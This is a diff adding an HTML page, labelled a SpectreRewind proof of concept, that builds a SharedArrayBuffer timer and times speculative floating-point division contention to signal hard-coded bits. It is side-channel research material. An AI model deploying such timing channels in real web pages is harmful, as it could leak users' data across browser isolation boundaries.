@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>SpectreRewind PoC in JavaScript</h2>
+
+Repeat the experiment 3 times.
+
+<p id="demo"></p>
+
+<script>
+  let i = 0;
+  let counter = 0;
+    
+  let train_num = 1 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0 * 3.0;
+  let train_div = 3.0;
+  let train_message = 0;
+    
+  let transmit_num = 150.0;
+  let transmit_div = 13.0;
+  let transmit_message = 10;
+  
+  let start = new Date();
+  
+  var buffer = new SharedArrayBuffer(129*4096);
+  var view = new Uint32Array(buffer, 0, 1024);
+  
+  var g_time = [];
+  
+  for( i = 0; i < 64; i++ ) {
+      g_time.push(0);
+  }
+    
+  var my_number = [];
+  var my_div = [];
+  var my_message = [];
+  var my_bit_no = [];
+  
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(1);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(3);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(1);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(3);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(1);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(train_num);    my_div.push(train_div);    my_message.push(train_message);    my_bit_no.push(0);
+  my_number.push(transmit_num); my_div.push(transmit_div); my_message.push(transmit_message); my_bit_no.push(3);
+    
+  var iter = 0;
+  var iter_max = 13;
+  var iter_max2 = 25;
+  
+  var my_number2 = 123456778910;
+  var my_number3 = 12345677891;
+  var my_number4 = 1234567789;
+  var my_number5 = 1234567789;
+  
+  var q = 0;
+  
+  function send_bit() {
+      var time1;
+      var j;
+      var k;
+      
+      for( j = 0; j < 64; j++ )
+      {
+          for(iter = 0; iter < iter_max; iter++);
+          for(iter = 0; iter < iter_max2; iter++);
+          
+          time1 = view[0]; /* READ TIMER */
+          
+          var numerator = my_number[j];
+          var div = my_div[j];
+          numerator = ((((((((((((((((((((((((numerator / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div) / div);
+          
+          if( 1.0 == numerator )
+          {
+              if ( my_message[j] & (1 << my_bit_no[j]) )
+              {
+                  var num2 = my_number2;  
+                  var num3 = my_number3;  
+                  var num4 = my_number4;  
+                  var num5 = my_number5;  
+                  for( k = 0; k < 100; k++ ) { 
+                      num2 /= div;
+                      num3 /= div;
+                      num4 /= div;
+                      num5 /= div;
+                  }
+                  my_number2 = num2;
+                  my_number3 = num3;
+                  my_number4 = num4;
+                  my_number5 = num5;
+              }
+          }
+          
+          g_time[j] = view[0] - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      }
+  }
+  
+  var worker = new Worker('worker.js');
+  
+  worker.postMessage({ buffer: buffer });
+  
+  i = 0;
+  
+  function increment() {
+      if( i > 3 )
+      {
+          return;
+      }
+      
+      var k;
+      start = new Date();
+      
+      var total0 = [];
+      var total1 = [];
+      var overall = 0;
+      
+      for (k = 0; k < 1024; k++) {
+          total0.push(0);
+          total1.push(0);
+      }
+      
+      for (k = 0; k < 10000; k++) {
+          send_bit();
+          
+          if( g_time[ 8] >= 0 && g_time[ 8] < 1024
+              && g_time[16] >= 0 && g_time[16] < 1024
+              && g_time[23] >= 0 && g_time[23] < 1024
+              && g_time[29] >= 0 && g_time[29] < 1024
+              && g_time[34] >= 0 && g_time[34] < 1024
+              && g_time[38] >= 0 && g_time[38] < 1024
+              && g_time[55] >= 0 && g_time[55] < 1024
+              && g_time[59] >= 0 && g_time[59] < 1024
+              && g_time[63] >= 0 && g_time[63] < 1024 )
+          {
+              total0[g_time[ 8]]++;
+              total0[g_time[29]]++;
+              total0[g_time[55]]++;
+              
+              total1[g_time[16]]++;
+              total1[g_time[34]]++;
+              total1[g_time[59]]++;
+              
+              overall += 3;
+          }
+      }
+      
+      document.getElementById("demo").innerHTML = "Experiment "  + i;
+      document.getElementById("demo").innerHTML += '<br/>' + "Time   bit0   bit1";
+      for( k = 0; k < 1024; k++ )
+      {
+          document.getElementById("demo").innerHTML += '<br/>' + k + "   " + (total0[k]*1.0)/overall + "    " + (total1[k]*1.0)/overall;
+      }
+      
+      i++;
+  }
+  
+  setInterval(increment, 1);
+  </script>
+
+</body>
+</html>
